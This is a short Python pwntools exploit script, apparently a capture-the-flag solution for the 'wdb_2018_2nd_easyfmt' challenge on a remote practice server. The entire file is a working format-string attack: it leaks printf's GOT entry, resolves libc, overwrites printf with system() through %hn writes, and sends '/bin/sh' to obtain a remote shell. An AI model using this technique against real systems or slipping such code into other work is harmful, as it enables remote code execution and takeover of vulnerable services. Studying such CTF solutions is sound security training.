#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/05/24 15:25:20
@Author  :   eur1ka  
@Version :   2.7
@Contact :   raogx.vip@hotmail.com
@License :   (C)Copyright 2017-2018, Liugroup-NLPR-CASIA
@Desc    :   None
'''

# here put the import lib

from pwn import *
from LibcSearcher import *
import pwnlib
context.log_level = 'debug'
debug = 0
if debug:
    sh = process('wdb_2018_2nd_easyfmt')
else:
    sh = remote('node3.buuoj.cn',29065)
elf = ELF('wdb_2018_2nd_easyfmt')
# libc = ELF()
printf_got = elf.got['printf']
payload = '%7$s' + p32(printf_got)
sh.sendline(payload)
printf_addr = u32(sh.recvuntil("\xf7")[-4:])
log.info("Success leak printf_addr:0x%x"%printf_addr)
libc = LibcSearcher('printf',printf_addr)
libc_base = printf_addr - libc.dump('printf')
system_addr = libc_base + libc.dump('system')
log.info("Success leak system_addr:0x%x"%system_addr)
sys_low = system_addr & 0xffff
sys_high = (system_addr >> 16)
payload = fmtstr_payload(6,{printf_got:system_addr})
payload = p32(printf_got) + p32(printf_got + 2) + '%' + str(sys_low - 8) + "c%6$hn%" + str(sys_high - sys_low) + "c%7$hn"
sh.sendline(payload)
sh.sendline("/bin/sh\x00")
sh.interactive()